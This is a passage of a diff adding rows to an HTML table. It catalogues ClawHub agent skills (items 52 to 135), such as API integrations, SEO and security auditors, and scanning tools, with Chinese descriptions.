+<td>AIboss助手</td>
+<td>AI Boss Assistant</td>
+<td><a href="https://clawdhub.com/skills/ai-boss-assistant">ClawHub/ai-boss-assistant</a></td>
+<td>将任何AI打造为专业行政助理，配备实战验证的角色和工作流，提供完整的Google Workspace集成模板（Gmail、日历、云端硬盘）、里程碑交付系统及安全指南。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>Privacy-first web search with DuckDuckGo-style bangs (!w, !yt, !gh)</td>
+<td>Privacy-first web search with DuckDuckGo-style bangs (!w, !yt, !gh)</td>
+<td><a href="https://clawdhub.com/skills/searxng-bangs">ClawHub/searxng-bangs</a></td>
+<td>通过SearXNG进行尊重隐私的网页搜索，支持DuckDuckGo风格的Bangs快捷指令。适用于在线查找信息。SearXNG通过随机化浏览器指纹、隐藏IP地址及拦截Cookies和引荐来源来保护隐私。支持250多种搜索引擎、多种类别（通用、新闻、图片、视频、科学）及Bangs快捷指令（如!w查维基百科、!yt查YouTube等），可同时聚合多个引擎的结果。对于注重隐私或高频搜索，建议优先使...</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>OpenClaw安全审计</td>
+<td>Openclaw Security Audit</td>
+<td><a href="https://clawdhub.com/skills/openclaw-security-audit">ClawHub/openclaw-security-audit</a></td>
+<td>审计 OpenClaw/Clawdbot 部署的错误配置与攻击向量。当用户请求对 OpenClaw/Clawdbot/Moltbot 进行安全审查、涉及网关/控制界面暴露、技能安全、凭证泄露或加固指导时使用。生成包含 OK/VULNERABLE 结果与修复建议的终端报告。</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>代理</td>
+<td>Agent</td>
+<td><a href="https://clawdhub.com/skills/agent">ClawHub/agent</a></td>
+<td>定义智能体的身份、性格、语气和边界，打造真实而非千篇一律的助手。</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>Zoho Books</td>
+<td>Zoho Books 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-books">ClawHub/zoho-books</a></td>
+<td>Zoho Books API集成，带托管OAuth。可管理发票、联系人、账单、费用及其他会计数据。适用于用户想要读取、</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>技能安全auditor</td>
+<td>Skill Security Auditor</td>
+<td><a href="https://clawdhub.com/skills/skill-security-auditor">ClawHub/skill-security-auditor</a></td>
+<td>ClawHub技能命令行安全分析器。安装前运行 analyze-skill.sh 扫描 SKILL.md 文件，检测恶意模式、凭据泄露及C2基础设施。内置含20余种检测模式的威胁情报数据库。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>Keap</td>
+<td>Keap 🔑</td>
+<td><a href="https://clawdhub.com/skills/keap">ClawHub/keap</a></td>
+<td>通过托管OAuth集成Keap API，管理联系人、公司、标签、任务、订单、机会和活动，用于CRM和营销自动化。使用...</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>Gumroad</td>
+<td>Gumroad 🔑</td>
+<td><a href="https://clawdhub.com/skills/gumroad">ClawHub/gumroad</a></td>
+<td>通过托管 OAuth 集成 Gumroad API，可访问产品、销售、订阅者、许可证和 webhook，适用于数字店面。当用户...</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>Twilio</td>
+<td>Twilio 🔑</td>
+<td><a href="https://clawdhub.com/skills/twilio-api">ClawHub/twilio-api</a></td>
+<td>通过托管 OAuth 集成 Twilio API，支持短信、语音通话、电话号码及通信功能，适用于需要发送短信或进行语音通话的场景。</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>OpenClawToken优化器</td>
+<td>OpenClaw Token Optimizer</td>
+<td><a href="https://clawdhub.com/skills/openclaw-token-save">ClawHub/openclaw-token-save</a></td>
+<td>通过审计上下文注入、精简工作区文件（AGENTS.md/SOUL.md/MEMORY.md 及每日记忆）并启用提示优化，来优化 OpenClaw 的 Token 用量与成本。</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>gh</td>
+<td>gh</td>
+<td><a href="https://clawdhub.com/skills/gh">ClawHub/gh</a></td>
+<td>使用 GitHub CLI (gh) 执行核心 GitHub 操作：认证状态、仓库创建/克隆/Fork、Issue、Pull Request、Release 及基础仓库管理。当请求通过 CLI 使用 gh、管理 GitHub 仓库、PR 或 Issue 时触发。</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>check分析</td>
+<td>Check Analytics</td>
+<td><a href="https://clawdhub.com/skills/check-analytics">ClawHub/check-analytics</a></td>
+<td>审核现有的 Google Analytics 实现，检查常见问题、缺失配置及优化机会。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>GmailOAuth配置</td>
+<td>Gmail OAuth Setup 🔑</td>
+<td><a href="https://clawdhub.com/skills/gmail-oauth">ClawHub/gmail-oauth</a></td>
+<td>通过 gog CLI 手动 OAuth 流程配置 Gmail API 访问，用于首次集成 Gmail、续期过期令牌或排查无头服务器上的 Gmail 认证问题。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>Elicitation - how to talk with humans and ask them questions?</td>
+<td>Elicitation - how to talk with humans and ask them questions?</td>
+<td><a href="https://clawdhub.com/skills/elicitation">ClawHub/elicitation</a></td>
+<td>运用叙事身份研究、自我定义记忆提取及动机访谈技术，通过自然对话进行心理侧写。适用于：理解核心价值观与动机，挖掘形成性记忆与人生经历，探测情绪图式与信念模式，通过逐步披露建立心理画像，开展深度洞察访谈，设计个人探索对话流，识别救赎与污染等身份主题，以及在不审问的情况下引出真实的自我表露。</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>Clawdbot安全套件</td>
+<td>Clawdbot Security Suite</td>
+<td><a href="https://clawdhub.com/skills/clawdbot-security-suite">ClawHub/clawdbot-security-suite</a></td>
+<td>Clawdbot 高级安全验证：模式检测、命令清理与威胁监控</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>微信搜索</td>
+<td>Wechat Search</td>
+<td><a href="https://clawdhub.com/skills/wechat-search">ClawHub/wechat-search</a></td>
+<td>使用OpenClaw的网页搜索、Tavily API和网页抓取功能搜索微信公众号文章，采用合规设计。</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>NetworkAI</td>
+<td>Network AI</td>
+<td><a href="https://clawdhub.com/skills/network-ai">ClawHub/network-ai</a></td>
+<td>本地 Python 编排技能：通过共享黑板文件实现多智能体工作流，支持权限门控、Token 预算脚本和持久化项目上下文。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>邮件bestpractices</td>
+<td>Email Best Practices</td>
+<td><a href="https://clawdhub.com/skills/email-best-practices">ClawHub/email-best-practices</a></td>
+<td>用于构建邮件功能、邮件进入垃圾箱、高退回率、设置SPF/DKIM/DMARC身份验证、实现邮件捕获、确保...</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>technicalSEO检查器</td>
+<td>Technical Seo Checker</td>
+<td><a href="https://clawdhub.com/skills/technical-seo-checker">ClawHub/technical-seo-checker</a></td>
+<td>用于检查技术SEO；审核抓取、索引、CWV（核心网页指标）、移动端、安全、重定向及证据缺口。技术SEO/网站速度</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>Basecamp</td>
+<td>Basecamp 🔑</td>
+<td><a href="https://clawdhub.com/skills/basecamp">ClawHub/basecamp</a></td>
+<td>通过托管OAuth实现Basecamp API集成，管理项目、待办、消息、日程、文档及团队协作。适用于用户需要...</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>Dropbox</td>
+<td>Dropbox 🔑</td>
+<td><a href="https://clawdhub.com/skills/dropbox-api">ClawHub/dropbox-api</a></td>
+<td>Dropbox API 集成，支持托管 OAuth。可处理文件、文件夹、搜索、元数据和云存储。当用户需要管理文件和文件夹时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>TwitterPost</td>
+<td>Twitter Post 🔑</td>
+<td><a href="https://clawdhub.com/skills/twitter-post">ClawHub/twitter-post</a></td>
+<td>通过官方 API v2 (OAuth 1.0a) 在 Twitter/X 上发布推文。适用于用户请求发推、发布推文串、回复或引用推文等情况。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>旅行代理</td>
+<td>Travel Agent Skill</td>
+<td><a href="https://clawdhub.com/skills/travel-agent">ClawHub/travel-agent</a></td>
+<td>{&quot;answer&quot;:&quot;邮件帮主人订改机票，一条消息全搞定。(BonBook出品)&quot;}</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>ActiveCampaign</td>
+<td>ActiveCampaign 🔑</td>
+<td><a href="https://clawdhub.com/skills/active-campaign">ClawHub/active-campaign</a></td>
+<td>ActiveCampaign API 集成，支持托管 OAuth。营销自动化、CRM、联系人、交易和电子邮件营销活动。使用此技能当用户想要管理...</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>抖音违禁词检测</td>
+<td>抖音违禁词检测</td>
+<td><a href="https://clawdhub.com/skills/douyin-sensitive-check">ClawHub/douyin-sensitive-check</a></td>
+<td>抖音/短视频违禁词和敏感词检测（本地词库版，无需 API Key）。每天首次使用自动从 GitHub 开源词库更新本地缓存，离线检测文案合规性。支持多词库合并（广告极限词、平台限流词、暴恐、色情、涉枪涉爆等）。使用场景：(1) 生成短视频文案后自动检测违禁词，(2) 用户要求检查某段文字是否有问题，(3) 抖音/...</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>mcporter技能</td>
+<td>mcporter</td>
+<td><a href="https://clawdhub.com/skills/mcporter-skill">ClawHub/mcporter-skill</a></td>
+<td>通过 mcporter CLI 管理并交互 MCP 服务器与工具，支持列出、配置、鉴权、调用工具以及生成 CLI/类型。</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>RedditCLI</td>
+<td>Reddit Cli</td>
+<td><a href="https://clawdhub.com/skills/reddit-cli">ClawHub/reddit-cli</a></td>
+<td>使用 Cookie 认证的 Reddit 命令行工具。支持阅读帖子、搜索及获取子版块信息。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>toughcoding</td>
+<td>toughcoding</td>
+<td><a href="https://clawdhub.com/skills/toughcoding">ClawHub/toughcoding</a></td>
+<td>为AI代理提供现代软件开发、新兴技术、AI及AI系统的权威知识与实践指南。</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>微软365集成</td>
+<td>Microsoft 365 Integration 🔑</td>
+<td><a href="https://clawdhub.com/skills/ms365">ClawHub/ms365</a></td>
+<td>通过 MS Graph API 访问并管理 Microsoft 365 邮件、日历、OneDrive 文件、待办任务和联系人，支持身份验证。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>XTwitterAutomation:30+APIs,OAuthPost,One密钥</td>
+<td>X/Twitter Automation: 30+ APIs, OAuth Post, One Key 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-twitter">ClawHub/openclaw-twitter</a></td>
+<td>搜索并读取 X（Twitter）：个人资料、时间线、提及、关注者、推文搜索、趋势、列表、社区和空间。使用后发布帖子。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>OpenClaw防护</td>
+<td>OpenClaw Shield</td>
+<td><a href="https://clawdhub.com/skills/openclaw-shield">ClawHub/openclaw-shield</a></td>
+<td>企业AI安全扫描器，采用静态分析、运行时防护与ClamAV，检测凭证窃取、数据泄露、恶意软件并确保审计日志。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>Systeme.io</td>
+<td>Systeme.io 🔑</td>
+<td><a href="https://clawdhub.com/skills/systeme">ClawHub/systeme</a></td>
+<td>Systeme.io API 集成（托管OAuth），可管理联系人、标签、课程、社区和订阅。当用户需要管理系统e时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>AgentGuard</td>
+<td>AgentGuard</td>
+<td><a href="https://clawdhub.com/skills/agentguard">ClawHub/agentguard</a></td>
+<td>监控代理的文件访问、API 调用与通信，检测可疑行为，记录事件并生成可操作的安全报告。</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>Nmap Recon</td>
+<td>Nmap Recon</td>
+<td><a href="https://clawdhub.com/skills/nmap-recon">ClawHub/nmap-recon</a></td>
+<td>使用 Nmap 进行网络侦察和端口扫描，发现开放端口、检测服务、识别漏洞并精准枚举目标。</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>加密工具</td>
+<td>Crypto Tools</td>
+<td><a href="https://clawdhub.com/skills/crypto-tools">ClawHub/crypto-tools</a></td>
+<td>获取加密数据，监控投资组合，识别诈骗，利用实时API与安全工具畅游交易所。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>Box</td>
+<td>Box 🔑</td>
+<td><a href="https://clawdhub.com/skills/box">ClawHub/box</a></td>
+<td>Box API 集成，使用托管 OAuth，管理文件、文件夹、协作和云存储。适用于用户需要上传、下载、共享等场景。</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>Vimeo</td>
+<td>Vimeo 🔑</td>
+<td><a href="https://clawdhub.com/skills/vimeo">ClawHub/vimeo</a></td>
+<td>Vimeo API 集成，支持托管 OAuth。视频托管与分享平台。当用户需要上传、管理或整理视频、创建共享链接等时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>Quo</td>
+<td>Quo 🔑</td>
+<td><a href="https://clawdhub.com/skills/quo">ClawHub/quo</a></td>
+<td>Quo API 集成，托管 OAuth，管理企业电话系统的通话、消息、联系人和对话。当用户想要...时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>数据lineage追踪器</td>
+<td>Data Lineage Tracker</td>
+<td><a href="https://clawdhub.com/skills/data-lineage-tracker">ClawHub/data-lineage-tracker</a></td>
+<td>追踪建筑系统中的数据来源、转换及流转，对于审计追踪、合规性及数据问题排查至关重要。</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>ClickSend</td>
+<td>ClickSend 🔑</td>
+<td><a href="https://clawdhub.com/skills/clicksend">ClawHub/clicksend</a></td>
+<td>ClickSend API 集成，托管身份验证，支持发送短信、彩信和语音消息，管理联系人和列表，适用于用户需要发送的场景。</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>ManyChat</td>
+<td>ManyChat 🔑</td>
+<td><a href="https://clawdhub.com/skills/manychat">ClawHub/manychat</a></td>
+<td>ManyChatAPI集成与托管认证。管理订阅者、标签和自定义字段，并通过Facebook Messenger发送消息。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>代码审查fix</td>
+<td>code-review-fix</td>
+<td><a href="https://clawdhub.com/skills/code-review-fix">ClawHub/code-review-fix</a></td>
+<td>自动审查代码，检测错误、安全、风格与性能问题，提供修复建议，并可选择性地附带解释进行修复。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>Brevo</td>
+<td>Brevo 🔑</td>
+<td><a href="https://clawdhub.com/skills/brevo-api">ClawHub/brevo-api</a></td>
+<td>Brevo API 集成，使用托管 OAuth。提供邮件营销、事务邮件、短信、联系人及 CRM 功能。当用户需要发送邮件、管理联系人时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>质量documentation管理器</td>
+<td>Quality Documentation Manager</td>
+<td><a href="https://clawdhub.com/skills/quality-documentation-manager">ClawHub/quality-documentation-manager</a></td>
+<td>医疗器械质量管理体系（QMS）文件控制系统管理。涵盖文件编号、版本控制、变更管理及21 CFR Part 11合规性。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>Tally</td>
+<td>Tally 🔑</td>
+<td><a href="https://clawdhub.com/skills/tally-api">ClawHub/tally-api</a></td>
+<td>托管OAuth的Tally API集成，管理表单、提交、工作区和webhooks，用于创建或管理Tally表单。</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>MailerLite</td>
+<td>MailerLite 🔑</td>
+<td><a href="https://clawdhub.com/skills/mailerlite">ClawHub/mailerlite</a></td>
+<td>MailerLite API 集成，托管OAuth，管理邮件订阅者、群组、推广活动、自动化和表单，用于添加订阅者等需求。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>NextJS</td>
+<td>NextJS</td>
+<td><a href="https://clawdhub.com/skills/nextjs">ClawHub/nextjs</a></td>
+<td>使用 App Router、服务端组件、缓存、认证和生产级模式构建 Next.js 15 应用。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>CallRail</td>
+<td>CallRail 🔑</td>
+<td><a href="https://clawdhub.com/skills/callrail">ClawHub/callrail</a></td>
+<td>CallRail API 集成，支持托管 OAuth。追踪并分析电话通话，管理追踪号码、公司和标签。当用户想要…时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>Everclaw</td>
+<td>Everclaw 🔑</td>
+<td><a href="https://clawdhub.com/skills/everclaw">ClawHub/everclaw</a></td>
+<td>为您的智能体提供加密云存储。API密钥在设备端生成,服务器仅存哈希值,绝不保存密钥。所有数据均采用AES-256-GCM加密存储,无人能读取,包括我们。换设备或重置智能体后,输入API密钥即可恢复全部记忆。</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>AppDeploy</td>
+<td>AppDeploy 🔑</td>
+<td><a href="https://clawdhub.com/skills/appdeploy">ClawHub/appdeploy</a></td>
+<td>部署Web应用（含后端API、数据库、文件存储、AI功能、认证、实时功能和定时任务）。用于用户要求部署或发布时。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>ClickFunnels</td>
+<td>ClickFunnels 🔑</td>
+<td><a href="https://clawdhub.com/skills/clickfunnels">ClawHub/clickfunnels</a></td>
+<td>通过托管OAuth实现ClickFunnels API集成，管理联系人、产品、订单、课程、表单和Webhook。适用于用户想要创建……时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>RSSaurus - Agent-Friendly RSS Feed Reader</td>
+<td>RSSaurus - Agent-Friendly RSS Feed Reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/rssaurus">ClawHub/rssaurus</a></td>
+<td>使用RSSaurus命令行工具(Go二进制`rssaurus`)在终端操作https://rssaurus.com：包括身份验证、列出订阅源/条目、输出URL供管道处理、打开链接，以及执行分类操作（已读/未读、批量已读、保存/取消保存）。适用于CLI自动化任务、调试token/配置问题或演示命令用法。</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>OpenClaw服务器安全技能</td>
+<td>openclaw-server-secure-skill</td>
+<td><a href="https://clawdhub.com/skills/openclaw-server-secure-skill">ClawHub/openclaw-server-secure-skill</a></td>
+<td>OpenClaw（前身为 Clawdbot/Moltbot）的全面安全加固与安装指南。当用户需要加固服务器、安装 OpenClaw 代理或为代理配置 Tailscale/防火墙时，请使用此技能。</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>研究助手</td>
+<td>Research Assistant</td>
+<td><a href="https://clawdhub.com/skills/research-assistant">ClawHub/research-assistant</a></td>
+<td>为AI智能体提供有序的研究和知识管理功能。适用于跨主题整理、存储、检索和导出研究笔记。支持添加带标签的笔记、列出主题、搜索所有笔记、导出为Markdown。非常适合多会话项目、追踪想法和维护结构化知识。</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>Secucheck</td>
+<td>Secucheck</td>
+<td><a href="https://clawdhub.com/skills/secucheck">ClawHub/secucheck</a></td>
+<td>针对OpenClaw的综合安全审计。扫描7个域（运行时、渠道、代理、计划任务、技能、会话、网络），支持3个专业级别，提供上下文感知分析和可视化仪表盘。仅读权限，带本地化报告。</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>SignNow</td>
+<td>SignNow 🔑</td>
+<td><a href="https://clawdhub.com/skills/signnow">ClawHub/signnow</a></td>
+<td>SignNow API 集成，支持托管 OAuth。电子签名平台，用于发送、签署和管理文档。当用户想要上传文档时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>Cognito Forms</td>
+<td>Cognito Forms 🔑</td>
+<td><a href="https://clawdhub.com/skills/cognito-forms">ClawHub/cognito-forms</a></td>
+<td>CognitoForms API 集成，支持托管 OAuth。可访问表单、条目和文档。在用户需要创建、读取、更新或删除表单、条目和文档时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>senior安全</td>
+<td>Senior Security</td>
+<td><a href="https://clawdhub.com/skills/senior-security">ClawHub/senior-security</a></td>
+<td>安全工程工具包，支持威胁建模、漏洞分析、安全架构及渗透测试，包含STRIDE分析与OWASP指南。</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>bitwarden密钥库</td>
+<td>Bitwarden Vault CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/bitwarden-vault">ClawHub/bitwarden-vault</a></td>
+<td>设置并使用 Bitwarden CLI (bw)。用于安装 CLI、身份验证（登录/解锁）或从密码库读取密钥。支持邮箱/密码、API 密钥和 SSO 身份验证方式。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>技能审计</td>
+<td>SkillLens Audit</td>
+<td><a href="https://clawdhub.com/skills/skill-audit">ClawHub/skill-audit</a></td>
+<td>利用 SkillLens CLI (`skilllens scan`, `skilllens config`) 审计本地安装的代理技能，排查安全或策略问题。当被要求扫描技能目录（Codex/Claude）并基于各技能的 `SKILL.md` 及捆绑资源生成风险审计报告时使用。</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>ibkr交易员</td>
+<td>IBKR Trading 🔑</td>
+<td><a href="https://clawdhub.com/skills/ibkr-trader">ClawHub/ibkr-trader</a></td>
+<td>通过Client Portal API实现盈透证券（IBKR）交易自动化。适用于设置IBKR账户访问、会话认证、查询投资组合/持仓或构建交易机器人。支持使用IBKR Key双因素认证处理IBeam自动登录。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>税务professional</td>
+<td>Tax Professional</td>
+<td><a href="https://clawdhub.com/skills/tax-professional">ClawHub/tax-professional</a></td>
+<td>{&quot;answer&quot;:&quot;美国税务顾问、扣税优化与记账工具。覆盖W-2/1099/S-Corp/混合收入，含预估税、查税风险、人生变故、跨州报税、房车抵税、税率优化、凭证留存及全年报税提醒。口袋CPA。&quot;}</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>后端</td>
+<td>Backend</td>
+<td><a href="https://clawdhub.com/skills/backend">ClawHub/backend</a></td>
+<td>构建可靠后端服务，做好错误处理、安全和可观测性。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>代理tinman</td>
+<td>Tinman -  AI Failure Mode Research, Prompt Injection &amp; Tool Exfil Detection</td>
+<td><a href="https://clawdhub.com/skills/agent-tinman">ClawHub/agent-tinman</a></td>
+<td>主动防御型AI安全扫描器 - 168种检测模式，288种攻击探针，安全/风险/放任模式，通过/tinman检查实现代理自我保护，loca...</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>AgentLedger</td>
+<td>AgentLedger</td>
+<td><a href="https://clawdhub.com/skills/agentledger">ClawHub/agentledger</a></td>
+<td>AI代理的支出追踪与记账工具。支持记录消费、设定预算、生成支出报告及管理多币种财务，数据本地存储。具备Privacy.com卡片导入、自然语言查询及CSV/JSON导出功能。适用于代理进行消费并需要财务审计追踪的场景。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>RAGLite</td>
+<td>RAGLite</td>
+<td><a href="https://clawdhub.com/skills/raglite">ClawHub/raglite</a></td>
+<td>本地优先 RAG 缓存：将文档提炼为结构化 Markdown，结合 Chroma（向量）与 ripgrep（关键词）进行索引和查询。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>OpenClaw安全监控</td>
+<td>OpenClaw Security Monitor</td>
+<td><a href="https://clawdhub.com/skills/openclaw-security-monitor">ClawHub/openclaw-security-monitor</a></td>
+<td>针对 OpenClaw 部署的主动安全监控、威胁扫描与自动修复</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>codex账户switcher</td>
+<td>Codex Account Switcher</td>
+<td><a href="https://clawdhub.com/skills/codex-account-switcher">ClawHub/codex-account-switcher</a></td>
+<td>通过捕获当前登录令牌，在多个已保存的 OpenAI Codex 账户间切换，并根据配额自动选择最佳账户</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>提供深度的个股挖掘与风控策略</td>
+<td>港股 AI 概念板块专属投研顾问。结合宏观流动性、南向资金博弈与 AI 产业基本面，提供深度的个股挖掘与风控策略。 🔑</td>
+<td><a href="https://clawdhub.com/skills/hk-ai-stock-expert">ClawHub/hk-ai-stock-expert</a></td>
+<td>港股 AI 概念板块专属投研顾问。结合宏观流动性、南向资金博弈与 AI 产业基本面，提供深度的个股挖掘与风控策略。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>37soul技能</td>
+<td>37soul 🔑</td>
+<td><a href="https://clawdhub.com/skills/37soul-skill">ClawHub/37soul-skill</a></td>
+<td>将AI代理连接至37Soul社交平台，实现真实互动、发帖、回复消息，并发展个性化社交形象。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>xpoz配置</td>
+<td>Xpoz Setup</td>
+<td><a href="https://clawdhub.com/skills/xpoz-setup">ClawHub/xpoz-setup</a></td>
+<td>设置并认证Xpoz MCP服务器以实现社交媒体情报功能。所有Xpoz技能的必备前置。仅需极少用户交互即可处理服务器配置、OAuth登录及连接验证。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>office365连接器</td>
+<td>Office 365 Connector 🔑</td>
+<td><a href="https://clawdhub.com/skills/office365-connector">ClawHub/office365-connector</a></td>
+<td>用于邮件（读取/发送）、日历（读取/写入）和联系人（读取/写入）的Office 365/Outlook连接器，采用弹性OAuth认证。现在支持多账户管理！可从单一技能管理多个Microsoft 365身份。解决连接Office 365邮件、日历和联系人的难题。使用Microsoft Graph API，附带完整的Azure应用注册设置指南。非常适合从OpenClaw访问您的Microsoft...</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>AzureInfra</td>
+<td>Azure Infra</td>
+<td><a href="https://clawdhub.com/skills/azure-infra">ClawHub/azure-infra</a></td>
+<td>基于聊天的 Azure 基础设施辅助工具，利用 Azure CLI 和门户上下文。用于查询、审计和监控 Azure 资源（VM、存储、IAM、Functions、AKS、应用服务、Key Vault、Azure Monitor、计费等），并在执行写入或破坏性操作前明确确认以提出安全变更建议。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>分析</td>
+<td>Analytics 🔑</td>
+<td><a href="https://clawdhub.com/skills/analytics">ClawHub/analytics</a></td>
+<td>部署隐私优先的分析系统，具备正确的API模式、速率限制及符合GDPR规范。</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>senior后端</td>
+<td>Senior Backend</td>
+<td><a href="https://clawdhub.com/skills/senior-backend">ClawHub/senior-backend</a></td>
+<td>设计和实现后端系统，包括 REST API、微服务、数据库架构、认证流程及安全加固。适用于...</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>内容质量auditor</td>
+<td>Content Quality Auditor</td>
+<td><a href="https://clawdhub.com/skills/content-quality-auditor">ClawHub/content-quality-auditor</a></td>
+<td>用于审核内容质量、E-E-A-T及发布就绪状态。运行80项CORE-EEAT评分，含否决检查与修复方案。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>On Page Seo Auditor</td>
+<td>On Page Seo Auditor</td>
+<td><a href="https://clawdhub.com/skills/on-page-seo-auditor">ClawHub/on-page-seo-auditor</a></td>
+<td>用于用户请求“审计页面SEO”，检查标题、标签、图片、链接、内容匹配度并制定修复优先级。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>swiftui性能审计</td>
+<td>Swiftui Performance Audit</td>
+<td><a href="https://clawdhub.com/skills/swiftui-performance-audit">ClawHub/swiftui-performance-audit</a></td>
+<td>审计并提升SwiftUI运行时性能，基于代码审查与架构优化。用于诊断渲染慢、滚动卡顿、CPU/内存占用高、视图频繁更新或布局抖动等问题，并在仅靠代码审查不足以定位时，提供用户自行使用 Instruments 进行性能分析的指导。</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>GitClassic</td>
+<td>GitClassic</td>
+<td><a href="https://clawdhub.com/skills/gitclassic">ClawHub/gitclassic</a></td>
+<td>快速、无JavaScript的GitHub浏览器，为AI代理优化。浏览公开仓库、读取文件、查看README，加载时间&lt;500ms。PRO版通过GitHub OAuth支持私有仓库。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>ClawScan</td>
+<td>ClawScan</td>
+<td><a href="https://clawdhub.com/skills/clawscan">ClawHub/clawscan</a></td>
+<td>ClawHub 技能安全扫描器，在安装前审查第三方技能，检测危险模式、可疑代码和风险依赖。</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>AWS\|Amazon网页服务</td>
+<td>AWS \| Amazon Web Services</td>
+<td><a href="https://clawdhub.com/skills/aws">ClawHub/aws</a></td>
+<td>架构、部署和优化AWS基础设施，避免成本激增和安全隐患。</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>AI技能扫描器</td>
+<td>AI Skill Scanner</td>
+<td><a href="https://clawdhub.com/skills/ai-skill-scanner">ClawHub/ai-skill-scanner</a></td>
+<td>在安装前扫描OpenBot/Clawdbot技能的安全漏洞、恶意代码和可疑模式。用于审核技能、检查ClawHub技能安全性、检测凭证泄露和提示注入。触发条件：安全审计、技能安全检查、恶意软件扫描或信任验证。</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>Skillscanner</td>
+<td>Skillscanner</td>
+<td><a href="https://clawdhub.com/skills/skillscanner">ClawHub/skillscanner</a></td>
+<td>Gen Digital出品的ClawHub技能安全扫描器，通过扫描API查询技能安全性。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>swiftconcurrency专家</td>
+<td>Swift Concurrency Expert</td>
+<td><a href="https://clawdhub.com/skills/swift-concurrency-expert">ClawHub/swift-concurrency-expert</a></td>
+<td>针对 Swift 6.2+ 版本进行 Swift 并发性审查与修复。适用于审查 Swift 并发性用法、改进并发合规性或修复功能及文件中的并发编译错误。</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>安全APIcalls</td>
+<td>Secure API Calls</td>
